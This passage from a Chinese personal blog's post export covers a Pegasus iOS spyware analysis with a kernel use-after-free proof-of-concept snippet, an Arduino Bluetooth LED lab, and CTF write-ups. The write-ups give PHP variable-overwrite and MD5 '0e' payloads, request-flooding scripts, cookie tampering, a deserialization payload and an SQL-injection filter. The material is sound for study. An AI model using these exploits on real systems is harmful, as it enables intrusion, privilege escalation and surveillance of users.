OSNumber::withNumber(value, len); // &lt;- len可控 next += 2; break; CVE-2016-4656： 是内核内存损坏，这个漏洞用于提权越狱，基于内核中的内存损坏漏洞。通过精心构造数据可以在Free之后先分配对象来重新占用之后再触发Use，也可以进一步转换成double free，获取内核态的执行权限从而执行越狱代码。 漏洞原理 1234567891011121314151617// open user clientCFMutableDictionaryRef matching = IOServiceMatching(&quot;IOSurfaceRoot&quot;);io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);io_connect_t connect = 0;IOServiceOpen(service, mach_task_self(), 0, &amp;connect); // add notification port with same refcon multiple timesmach_port_t port = 0;mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;port);uint64_t references;uint64_t input[3] = &#123;0&#125;;input[1] = 1234; // keep refcon the same valuefor (int i=0; i&lt;3; i++)&#123; IOConnectCallAsyncStructMethod(connect, 17, port, &amp;references, 1, input, sizeof(input), NULL, NULL);&#125;IOServiceClose(connect); 通过POC代码可以看到漏洞存在于17号调用函数，定位后对其进行逆向分析。该函数会将传入的port、callback、refcon等数据保存起来，以供需要向用户态发送消息时使用。传入的数据大小是0x18，前两个64位数据分别是callback地址和refcon的值。值得注意的是在保存数据前会首先检查相同的refcon是否已经存在，如果存在则认为已经添加过了，会调用releaseAsyncReference64函数释放reference，从而调用iokit_release_port_send释放我们传入的port，并且返回0xE00002C9号错误。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 if ( !a3-&gt;asyncReference ) return 0xE00002C2LL; input = (__int64)a3-&gt;structureInput; reference = (__int64)a3-&gt;asyncReference; v6 = *(_QWORD *)(a1 + 224); v7 = 0xE00002BDLL; IORecursiveLockLock_53(*(_QWORD *)(v6 + 264)); v8 = *(_QWORD *)(v6 + 344); if ( v8 ) &#123; // 检查相同refcon的数据是否已经存在 while ( *(_QWORD *)(v8 + 32) != *(_QWORD *)(input + 8) || *(_QWORD *)(v8 + 88) != a1 ) &#123; v8 = *(_QWORD *)v8; if ( !v8 ) goto LABEL_8; &#125; IOUserClient::releaseAsyncReference64(reference); v7 = 0xE00002C9LL; &#125; else &#123; // 分配内存并通过setAsyncReference64初始化，保存port/callback/refconLABEL_8: v9 = IOMalloc_53(96LL); v10 = v9; if ( v9 ) &#123; v11 = v6 + 344; memset_53((void *)v9, 0, 0x60uLL); IOUserClient::setAsyncReference64(v10 + 16, *(_QWORD *)reference, *(_QWORD *)input, *(_QWORD *)(input + 8)); *(_QWORD *)(v10 + 88) = a1; *(_QWORD *)(v10 + 80) = *(_QWORD *)(input + 16); v12 = *(_QWORD *)(v6 + 344); *(_QWORD *)v10 = *(_QWORD *)(v6 + 344); if ( v12 ) *(_QWORD *)(v12 + 8) = v10; else *(_QWORD *)(v6 + 352) = v10; v7 = 0LL; *(_QWORD *)v11 = v10; *(_QWORD *)(v10 + 8) = v11; &#125; &#125; IORecursiveLockUnlock_53(*(_QWORD *)(v6 + 264)); return v7;&#125; CVE-2016-4657：safari的内核webkit漏洞，Safari Webkit中存在一个漏洞，能够执行任意代码。Pegasus会利用这个漏洞获取Safari浏览器内的代码执行权限。 利用以上的三个漏洞，只要用户点击了特定的url，Pegasus就会开始攻击，从而实现监控获取用户的信息。 四、攻击流程Pegasus的可怕之处在于，攻击过程基本不需要用户交互，用户所要做的仅仅是点击一个链接，接着，攻击者就可以静默地传送payload，然后远程越狱，安装间谍软件。用户唯一能感知到的情况就是点击链接之后，浏览器自动关闭了。间谍软件中包含恶意代码、进程和用于监控用户行为并进行反馈的app。 实际上，iOS的安全机制并不允许应用相互监控，但是可以在越狱的设备上安装用户监控的hook。Pegasus就是利用了远程越狱和hook。Pegasus将它的动态库插入到设备里的针对正规进程中。这些动态库之后就会使用Cydia Mobile Substrate框架去hook应用。 受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的漏洞，以确保进攻成功进行。 第一阶段：传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4655漏洞，这个阶段是诱使受害者点击一个网站地址，诱发漏洞，执行代码，32位机器和64位机器分别下载用于下个阶段的代码；。 第二阶段：越狱。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。传统的云端特征码检测技术在此失效，软件包内包含针对iOS内核两个漏洞(CVE-2016-4656和CVE-2016-4657)的exp还有一个用来下载解密第三阶段软件包的loader。这些包中含有内核基质定位代码和UAF漏洞利用代码，并且包含了代码解密程序。在此阶段内核基质被定位并被越狱。 第三阶段：安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。 另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh，使其成为Pegasus专属监控设备。程序也会监控三个阶段的执行是否成功，如果失败（或者特定状态下），则清除自身不留痕迹。 软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。 第三阶段中，间谍会部署一个test222.tar文件，这是一个tar包，包中包含各种实现各种目的的文件，如实现中间人攻击的根TLS证书、针对Viber、Whatsapp的嗅探库、专门用于通话录音的库等。 五、越狱后维持一旦内核被攻破了，Pegasus开始准备安装越狱环境。 ●关闭内核保护措施，例如代码签名 ●重新挂载系统分区 ●清除Safari的缓冲区（清除攻击痕迹） ●写入越狱文件（包含主要加载器 /sbin/mount_nfs） 在上一节的阶段二中，Pegasus会移除/etc/nfs.conf导致文件系统加载/sbin/mount_nfs（这就是阶段三的越狱加载器），/sbin/mount_nfs是以root的权限运行的，所以越狱软件接管了系统的完整权限。阶段三结束后，Pegasus需要在重启后也继续维持越狱状态，所以使用一段jsc二进制代码替换了系统中的rtbuddyd，并且链接到CVE-2016-4657，达到越狱持久化。 六、隐蔽性Pegasus的自我保护和反侦察功能是优先于监控功能的。也就是说，宁可不再监控，也要保护自己不被发现。Pegasus有一大堆功能来保持其隐蔽性和静默性，它持续地监控手机状态并且阻止任何其他的方法来越狱/连接手机，并且当纸包不住火时，它有完整的自毁功能，从手机里完整的移除自己。而且，阶段三禁用了软件更新，使手机无法收到任何软件更新提示信息，从而很好的隐藏自己。 七、影响监控软件可以完全控制以下软件：GMAIL，FACETIME，FACEBOOK，LINE，MAIL.RU，CALENDAR，WECHAT，SURESPOT，TANGO，VIBER，SKYPE，TELEGRAM，KAKAOTALK，从而获得用户的信息。 用户感染了Pegasus之后，手机处于完全的监控状态之中，包括电话录音，通话记录，短信，麦克风/摄像头实时通信（几乎变成对讲机）。在这个阶段获取到信息之后，监控者可以将这些信息用于下个阶段的入侵，例如拿到你的银行卡账户和密码，拿到邮箱账户密码，以及社保等等。 参考文章1 参考文章2 参考文章3","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"IOT实验-Arduino蓝牙模块控制小灯","slug":"编程/IOT实验-arduino蓝牙模块控制小灯","date":"2019-04-09T12:11:51.000Z","updated":"2021-05-23T07:31:27.174Z","comments":true,"path":"2019/04/09/编程/IOT实验-arduino蓝牙模块控制小灯/","link":"","permalink":"http://example.com/2019/04/09/%E7%BC%96%E7%A8%8B/IOT%E5%AE%9E%E9%AA%8C-arduino%E8%93%9D%E7%89%99%E6%A8%A1%E5%9D%97%E6%8E%A7%E5%88%B6%E5%B0%8F%E7%81%AF/","excerpt":"前言一个简单IOT实验，记录一下，以后还能看看","text":"前言一个简单IOT实验，记录一下，以后还能看看 正文一、实验要求在面向智能家居的物联网系统场景中，一般要提供对日光灯的无线控制。本实验旨在构建一个蓝牙遥控灯原型。本实验基于Arduino开发套件、蓝牙模块，运用App Inventor快速开发一个遥控APP，实现对Arduino驱动的发光二极管的开关控制。APP至少设计四个按钮，分别控制3种不同的发光二极管，一个控制跑马灯效果。 二、学习内容1． 蓝牙模块技术参数 2． Arduino电路连接蓝牙模块的方法 3． 进一步掌握Arduino程序编写方法 三、技术原理蓝牙参数特点 1.蓝牙核心模块使用HC-06从模块，引出接口包括VCC,GND,TXD,RXD,预留LED状态输出脚，单片机可通过该脚状态判断蓝牙是否已经连接 2.LED指示蓝牙连接状态，闪烁表示没有蓝牙连接，常亮表示蓝牙已连接并打开了端口 3.输入电压3.6~6V，未配对时电流约30mA，配对后约10mA，输入电压禁止超过7V！ 4.可以直接连接各种单片机（51，AVR，PIC，ARM，MSP430等），5V单片机也可直接连接 5.在未建立蓝牙连接时支持通过AT指令设置波特率、名称、配对密码，设置的参数掉电保存。蓝牙连接以后自动切换到透传模式 6.该蓝牙为从机，从机能与各种带蓝牙功能的电脑、蓝牙主机、大部分带蓝牙的手机、Android、PDA、PSP等智能终端配对，从机之间不能配对。 Arduino 与蓝牙模块连接方法 VCC：接Arduino的5V。 GND：接Arduino的GND。 TXD：发送端，一般表示为自己的发送端，接Arduino的RX。 RXD：接收端，一般表示为自己的接收端，接Arduino的TX。 正常通信时候本身的TXD永远接设备的RXD！正常通信时RXD接其他设备的TXD， 自收自发：顾名思义，就是自己接收自己发送的数据，即自身的TXD直接连接到RXD，用来测试本身的发送和接收是否正常，是最快最简单的测试方法，当出现问题时首先做该测试确定是否产品故障。也称回环测试。 线接好后，把Arduino上电后，蓝牙的指示灯是闪烁的，表明没有设备连接上。 实验电路连接 注意： TXD：发送端，一般表示为自己的发送端，接Arduino的RX。 RXD：接收端，一般表示为自己的接收端，接Arduino的TX。 正常通信时候本身的TXD永远接设备的RXD！正常通信时RXD接其他设备的TXD， 遥控App设计Appinventor 组件设计 逻辑设计 实验程序代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int ledpin10=10; //红灯10接口int ledpin9=9; //黄灯9接口int ledpin8=8; //绿灯8接口void setup() &#123; // put your setup code here, to run once: Serial.begin(9600); pinMode(ledpin10,OUTPUT); pinMode(ledpin9,OUTPUT); pinMode(ledpin8,OUTPUT);&#125;void loop() &#123; // put your main code here, to run repeatedly: while(Serial.available())&#123; int n=Serial.read(); if(n==10)&#123; //红灯闪烁 digitalWrite(ledpin10,HIGH); delay(1000); digitalWrite(ledpin10,LOW); &#125; if(n==9)&#123; //黄灯闪烁 digitalWrite(ledpin9,HIGH); delay(1000); digitalWrite(ledpin9,LOW); &#125; if(n==8)&#123; //绿灯闪烁 digitalWrite(ledpin8,HIGH); delay(1000); digitalWrite(ledpin8,LOW); &#125; if(n==7)&#123; //跑马灯 while(1)&#123; digitalWrite(ledpin10,HIGH); delay(1000); digitalWrite(ledpin10,LOW); digitalWrite(ledpin9,HIGH); delay(1000); digitalWrite(ledpin9,LOW); digitalWrite(ledpin8,HIGH); delay(1000); digitalWrite(ledpin8,LOW); &#125; &#125;&#125;&#125; 写好代码之后要上传到组件中，操作如下： 要保证要相关驱动才行，没有驱动的话，可以用驱动精灵安装，然后选择COM4 然后上传。 打开手机蓝牙，与蓝牙模块配对，即可。 这个实验比较简单，就这样啦。","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"PHP变量覆盖","slug":"大学CTF/PHP变量覆盖","date":"2019-04-06T05:13:26.000Z","updated":"2019-11-20T07:29:58.747Z","comments":true,"path":"2019/04/06/大学CTF/PHP变量覆盖/","link":"","permalink":"http://example.com/2019/04/06/%E5%A4%A7%E5%AD%A6CTF/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/","excerpt":"前言变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击。 经常导致变量覆盖漏洞场景有：$$，extract()函数，parse_str()函数等","text":"前言变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击。 经常导致变量覆盖漏洞场景有：$$，extract()函数，parse_str()函数等 正文**$**变量覆盖问题简介在PHP中$$表示的是一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。 123456&lt;?php$c=&#x27;hello&#x27;;$$c=&#x27;world&#x27;;echo $c;echo $$c;?&gt; 在这个例子中，$是变量标识符，c是变量名，而下面的变量$$c，是把$c当成了当成了变量名的一个变量，上面的输出结果是: helloworld //$(c)=hello $($c)=world 这样看起来更好一点 漏洞产生使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。 123456789&lt;?php$ary=array(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;c&#x27;,&#x27;e&#x27;);foreach($ary as $key=&gt;$value)&#123; //$ary的键名赋给$key，键值赋给$value $$key=$value; //把键值赋给$$key&#125;print_r($key); //输出4print_r($value); //输出eprint_r($$key); //输出e?&gt; 换成$_GET和$_POST是一样的 1234567&lt;?php$id=5;foreach ($_GET as $key =&gt; $value) &#123;$$key = $value;&#125;echo $a;?&gt; 如果get传的是?id=1，那么，经过**$$key = $value**之后，就会变成$id=1，覆盖掉原来的$id=5. 漏洞复现1234567891011121314151617181920&lt;?phpinclude &quot;flag.php&quot;; $_403 = &quot;AccessDenied&quot;;$_200 = &quot;Welcome Admin&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;) die(&quot;BugsBunnyCTF is here :p…&quot;);if ( !isset($_POST[&quot;flag&quot;]) ) die($_403);foreach ($_GET as $key =&gt; $value) $$key = $$value; foreach ($_POST as $key =&gt; $value) $$key = $value;if ( $_POST[&quot;flag&quot;] !== $flag ) die($_403);else&#123; echo &quot;This is your flag : &quot;. $flag . &quot;\\n&quot;; die($_200);&#125;?&gt; 从源码文件中可以看出，要想获得flag，你必须知道原来的flag，那是不可能的，这个时候我们就可以利用变量覆盖漏洞。 12foreach ($_GET as $key =&gt; $value) $$key = $$value 当get上传$_200=flag,经过$$key = $$value的处理后，就会变为$_200=$flag，这样就会将原来的$_200的值覆盖掉，换成$flag的值。 foreach ($_POST as $key =&gt; $value) $$key = $value; 这里的$$key = $value，将数组的值当做这个$$key的值。例如post方法传入flag=abc，则处理后变成$flag=abc。这样就造成将我们需要获取的flag的值给覆盖掉了。不过，当通过get传入_200=flag之后，flag的值将会赋给_200，这时候随便post什么都可以，反正flag已经在_200=flag里面了。 所以payload： get：_200=flag post：flag=aaaaa 复现成功。 extract()函数定义和用法extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。具体信息 语法 extract(array,extract_rules,prefix) 参数 描述 array 必需。规定要使用的数组。 extract_rules 可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。可能的值： EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。 EXTR_SKIP - 如果有冲突，不覆盖已有的变量。 EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。 EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。 EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。 EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。 EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。 EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。 prefix 可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。 该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。 例如： 123456&lt;?php$a = &quot;Original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);extract($my_array);echo &quot;\\$a = $a; \\$b = $b; \\$c = $c&quot;;?&gt; 输出结果为： $a = Cat; $b = Dog; $c = Horse 这样就可以实现变量覆盖。 漏洞复现1234567891011&lt;?phpinclude(&#x27;flag.php&#x27;)$test=&#x27;*************&#x27;;extract($_GET);if(isset($gift))&#123; $content=trim($test); if($gift==$content)&#123; echo &#x27;flag is&#x27;,$flag; &#125; echo &#x27;error&#x27;;&#125; 变量content的值是通过读取变量test的值获取到的。如果两个变量相等输出flag。如果不相等，输出错误。但是我们并不知道test的值是什么？所以我们使用变量覆盖漏洞，重新给test赋值。 例如：$_GET[‘test’]=’a’,被extract()函数处理后，就变成了$test=’a’,有与之同名的变量$test = ‘*******‘;，将其值覆盖掉。并且get方法传输的gift参数的值也为a。这样，$gift=$content。就可以获得flag。 构造我们的payload： Get方法传值：?gift=a&amp;test=a. 今天就写这两个把，肚子疼的厉害。 Parse_str()分析Parse_str()–将字符串解析成多个变量 注释： parse_str(string,array) 如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。 php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。 例子: 12345&lt;?phpparse_str(&quot;name=Bill&amp;age=60&quot;);echo $name.&quot;&lt;br&gt;&quot;;echo $age;?&gt; 输入： Bill 60 漏洞复现1234567891011121314151617&lt;?phperror_reporting(0); //函数规定不同级别错误，这里为关闭错误报告if(empty($_GET[&#x27;id&#x27;]))&#123; show_source(__FILE__); //显示文件 die();&#125;else&#123; include(&#x27;flag.php&#x27;); $a=&quot;www.OPENCTF.com&quot;; $id=$_GET[&#x27;id&#x27;]; @parse_str($id);//把查询字符串解析到变量中，没有使用array选项，若有同名变量，将原来的覆盖。这里明显将原来的$a的值给覆盖掉。 if($a[0]!=&#x27;QNKCDZO&#x27;&amp;&amp;md5($a[0])==md5(&#x27;QNKCDZO&#x27;))&#123; //判断$a[0]的值不是QNKCDZO并且$a[0]的MD5值要和QNKCDZO的MD5值相同,很难找出这样的字符串。 echo $flag; &#125;else&#123; exit(&#x27;其实很简单，其实并不难&#x27;); &#125;&#125; 这里最重要的就是处理if($a[0]!=&#39;QNKCDZO&#39;&amp;&amp;md5($a[0])==md5(&#39;QNKCDZO&#39;))这个问题，我们要找到一个字符串值和QNKCDZO不同，但是字符串的MD5值和QNKCDZO的MD5值相同。 这里要利用PHP处理0e开头的MD5哈希字符串的漏洞，PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，这样的话两个不同字符串也就可以相等了，都等于0就行。以0e开头的这样的 而QNKCDZO的MD5加密后的值是0e830400451993494058024219903391，所以再找一个字符串，值和QNKCDZO不要，但MD5加密后的值是0e开头的字符串就行 构造payload： ?id=a[]=s1836677006a` 参考文章","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"php变量覆盖","slug":"php变量覆盖","permalink":"http://example.com/tags/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"}]},{"title":"CUMT-ctf实训平台","slug":"大学CTF/CUMT-ctf实训平台","date":"2019-04-02T07:00:02.000Z","updated":"2019-11-19T12:58:43.006Z","comments":true,"path":"2019/04/02/大学CTF/CUMT-ctf实训平台/","link":"","permalink":"http://example.com/2019/04/02/%E5%A4%A7%E5%AD%A6CTF/CUMT-ctf%E5%AE%9E%E8%AE%AD%E5%B9%B3%E5%8F%B0/","excerpt":"前言学校实训平台的题目，做一做。","text":"前言学校实训平台的题目，做一做。 正文源代码直接查看源代码，把汉字去了，就是flag colorsnake是个贪吃蛇游戏，要吃够50分才可以得到flag，但是 直接吃的话很难做到，还得作弊才行。 看看源码，在结尾处发现一个game.js 打开之后又是一段代码，很长我是看不懂，搜索看看有没有其他页面存在，发现一个getScore.php 再打开看看 一段json编码后的字符，其他也不知道是什么，但是看到了score：0，这是记录分数的。刷新一下页面之后，发现分数变成1了 又刷了一次，又变回0了，然后一直刷刷刷，总是会变回0，不能刷太快也不能刷太慢，差不多每秒一次的样子，尝试写个脚本 123456789101112import requestsimport jsonimport timeurl=&#x27;http://bxs.cumt.edu.cn/challenge/web/colorSnake/getScore.php&#x27;ses=url.session()for i in range(51): time.sleep(1) ans=ses.get(url) msg=json.loads(ans.content)[&#x27;msg&#x27;] print(json.loads(ans.content)[&#x27;score&#x27;],msg.encode(&#x27;utf-8&#x27;)) 还有一个方法 备份打开题目，有两个要下载的文件，下载之后，也没发现啥，题目又说有很多备份文件，直接在url里添加1.bak，发现可以直接下载，那看来是藏在这里面了，但是你不可能一个一个找出来的，需要写一个脚本 12345678910import requestsurl=&#x27;http://bxs.cumt.edu.cn/challenge/web/code/&#123;num&#125;.bak&#x27;for i in range(1000): url2=url.format(num=i) ans=requests.get(url2) if flag in ans.text: print ans.text 上传一不知道什么鬼，直接bp抓包，改了个后缀名就行了 自动获取flag程序查看源码 12345678910111213141516171819202122232425262728293031323334// 请求参数一$(&quot;#a&quot;).click(function()&#123; $.ajax(&#123; url:&#x27;param1.php&#x27;, method:&#x27;get&#x27;, dataType:&#x27;json&#x27;, success:calParam2 &#125;)&#125;);function calParam2(d)&#123; var data=JSON.parse((d.param)); var length=data.length; var second=new Date().getSeconds(); var sum=0; for (var i = 1; i &lt; length; i++) &#123; for (var j = 0; j &lt; length/2; j++) &#123; sum+=parseInt(data[i])*second + data[j]; &#125; &#125; // 请求flag $.ajax(&#123; url:&#x27;http://new.ctf.param.com/aram2.php?sum=&#x27;+sum, #这个url与上面的不一样，很明显是错误的 method:&#x27;get&#x27;, dataType:&#x27;json&#x27;, success:function(s)&#123; alert(s.f); &#125;, error:function(s)&#123; alert(&#x27;错了&#x27;); &#125; &#125;)&#125; 打开param1.php，得到： 1&#123;&quot;param&quot;:&quot;%5B%221%22%2C%226%22%2C%222%22%2C%228%22%2C%224%22%2C%222%22%2C%228%22%2C%224%22%2C%229%22%2C%221%22%2C%2210%22%5D&quot;&#125; 解码后 1&#123;&quot;param&quot;:&quot;[&quot;1&quot;,&quot;6&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;9&quot;,&quot;1&quot;,&quot;10&quot;]&quot;&#125; 打开param2.php，得到： 1&#123;&quot;f&quot;:&quot;\\u5475\\u5475\\u5475\\u5475\\u5475\\u5475&quot;&#125; 解码后： 1&#123;&quot;f&quot;:&quot;呵呵呵呵呵呵&quot;&#125; 把第二个url对照第一个改为：’param2.php?param=’+sum,但是程序中直接得到的参数是编码的所以在程序中加上解码语句d.param=unescape(d.param) 1234567891011121314151617181920212223242526 function calParam2(d)&#123; d.param=unescape(d.param); var data=JSON.parse((d.param)); var length=data.length; var second=new Date().getSeconds(); var sum=0; for (var i = 1; i &lt; length; i++) &#123; for (var j = 0; j &lt; length/2; j++) &#123; sum+=parseInt(data[i])*second + data[j]; &#125; &#125; // 请求flag $.ajax(&#123; url:&#x27;param2.php?param=&#x27;+sum, method:&#x27;get&#x27;, dataType:&#x27;json&#x27;, success:function(s)&#123; alert(s.f); &#125;, error:function(s)&#123; alert(&#x27;错了&#x27;); &#125; &#125;)&#125; 为什么要加上d.param而不是参数d呢？我没学过JS，但是看参数d的形式就是python字典，要解码的是字典里的后半部分.参考文章 cookie既然提示cookie了，而且要管理员登录，直接bp抓包， 查看cookie，发现user=guest，直接删掉，改成user=admin 在url访问一下k.jpg，得到一张图，是维吉尼亚，这就好说了，直接把那个密文哪去解密，key=e，解密之后就是flag 上传二上传一就给了flag了， logic查看源码 发现了一些有用的东西 记录了文件编辑器是vim，那么就有可能有文件泄露，尝试submit.php.swp，得到一个文件，其中的关键代码如下 12345678910111213if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die(&#x27;fail&#x27;); if($token!=&#x27;0&#x27;) die(&#x27;fail&#x27;); $sql = &quot;SELECT count(*) as num from `user` where token=&#x27;$token&#x27; AND email=&#x27;$emailAddress&#x27;&quot;; $r = mysql_query($sql) or die(&#x27;db error&#x27;); $r = mysql_fetch_assoc($r); $r = $r[&#x27;num&#x27;]; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo &quot;失败了呀&quot;; &#125;&#125; 要求token不空，emailaddress不空，token长度要等于10，而且要token=’0’，这样信息也就收集的差不多了 用户名admin，邮箱&#99;&#x68;&#x65;&#x6e;&#x79;&#x75;&#x72;&#117;&#x69;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;，token=0000000000即可。 上传三随便上传一个，发现和前两题一毛一样的回显，但是没有flag啊， 只能尝试其他后缀试试，发现phtml上传成功的时候，会回显出来一句话 提示说上传的文件被删除了，没办法，看了看writeup，都是写的脚本爆破的，如下： 1234567import requestsurl = &quot;http://202.119.201.199/challenge/web/uploadfile/upload/eee.phtml&quot;ses=requests.session()while True: ans= ses.get(url) if &quot;flag&quot; in ans.text: print(ans.text) is hash safe??题目没了 淘金这题要抢金币，来购买flag，抢劫的时间只有三秒，而且千万一个人要过五秒才能再次抢他。 可以看到，抢劫成功后，变成了dorob.php，试了一下，只要你点击了名字，可以不管验证码，直接打开dorob.php就可以抢到金币，这样就绕过了验证码。 脚本不会写看的同学的，0verwatch 听说你会面向对象源码 123456789101112131415161718192021222324252627282930313233 &lt;?php//flag in flag.phpclass Admin&#123; public $file = &#x27;flag.php&#x27;; public function __construct($f) &#123; $this-&gt;file = $f; &#125; public function __wakeup() &#123; // TODO: Implement __wakeup() method. if (stripos($this-&gt;file,&#x27;flag&#x27;)+1)&#123; echo &#x27;dangerrous&#x27;; $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125; public function __destruct() &#123; var_dump($this-&gt;file); var_dump(file_exists($this-&gt;file)); // TODO: Implement __destruct() method. if (!strpos($this-&gt;file,&#x27;/&#x27;)&amp;&amp;!strpos($this-&gt;file,&#x27;\\\\&#x27;))&#123; highlight_file($this-&gt;file); &#125;else die(&#x27;你想干嘛&#x27;); &#125;&#125;if ($_GET[&#x27;data&#x27;])&#123; @unserialize($_GET[&#x27;data&#x27;]);&#125;else&#123; highlight_file(&#x27;index.php&#x27;);&#125;?&gt; 是考察PHP的序列化问题的，可以看一下我的另一篇文章《PHP的序列化与反序列化》 这里直接构造序列化后的语句： O:5:”Admin”:2:{s:4:”file”;s:8:”flag.php”;} 稍微有点难的注入先看看源码，发现注释里面有source.zip，下载。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php//sql注入防御 by cyr//defense.phpclearInput($_POST);clearInput($_GET);clearInput($_COOKIE);function clearInput($input)&#123; if(is_array($input))&#123; foreach ($input as $key =&gt; $value)&#123; clearInput($value); &#125; &#125;else&#123; if(!get_magic_quotes_gpc()) $input = addslashes($input); $orginInput = $input; $input = str_ireplace(&quot;\\&quot;&quot;,&quot;/&quot;,$input); $input = str_ireplace(&quot;&#x27;&quot;,&quot;/&quot;,$input); $input = str_ireplace(&quot;*&quot;,&quot;/&quot;,$input); $input = str_ireplace(&quot;~&quot;,&quot;/&quot;,$input); $input = str_ireplace(&quot;(&quot;, &quot;/&quot;, $input); $input = str_ireplace(&quot;)&quot;, &quot;/&quot;, $input); $input = str_ireplace(&quot;select&quot;, &quot;\\sel\\ect&quot;, $input); $input = str_ireplace(&quot;insert&quot;, &quot;\\ins\\ert&quot;, $input); $input = str_ireplace(&quot;update&quot;, &quot;\\up\\date&quot;, $input); $input = str_ireplace(&quot;delete&quot;, &quot;\\de\\lete&quot;, $input); $input = str_ireplace(&quot;union&quot;, &quot;\\un\\ion&quot;, $input); $input = str_ireplace(&quot;into&quot;, &quot;\\in\\to&quot;, $input); $input = str_ireplace(&quot;load_file&quot;, &quot;\\load\\_\\file&quot;, $input); $input = str_ireplace(&quot;outfile&quot;, &quot;\\out\\file&quot;, $input); $input = str_ireplace(&quot;sleep&quot;, &quot;\\sle\\ep&quot;, $input); $input = str_ireplace(&quot;banchmark&quot;, &quot;ban\\chm\\ark&quot;, $input); $input = str_replace(&quot;like&quot;, &quot;li\\ke%&quot;, $input); $input_html=$input; $input = strip_tags($input); if($input_html!=$input) $input=&#x27;&#x27;; $input = str_replace(&quot;%&quot;, &quot;\\%&quot;, $input); if(strlen($orginInput)!=strlen($input))&#123; die(&#x27;sql injection detected!&#x27;); &#125; return $input; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?php//index.phpinclude_once &#x27;defense.php&#x27;; //防注入include_once &#x27;config.php&#x27;; //数据库连接mysql_select_db(&quot;2015KDCTF_sqlsql&quot;);error_reporting(0);foreach ($_GET as $key =&gt; $value) &#123; $$key = $value;&#125;var_dump($query);$typeData = getData(&quot;SELECT * from type where id=&#x27;$type&#x27;&quot;);if(!empty($typeData))&#123; $query = &quot;where type=&#x27;&#123;$type&#125;&#x27;&quot;;&#125;$query = ($query)?$query:&#x27;where 1=2&#x27;;$sql = &quot;SELECT * from news &quot;.$query;$resultNEWS = getData($sql);function getData($sql)&#123; $r = mysql_query($sql); $result = array(); if ($r) &#123; while ($row = mysql_fetch_assoc($r)) &#123; $result[] = $row; &#125; return $result; &#125; return false;&#125;//flag 在数据库中?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot; /&gt; &lt;meta name=&quot;renderer&quot; content=&quot;webkit&quot; /&gt; &lt;title&gt;看新闻&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;ul&gt; 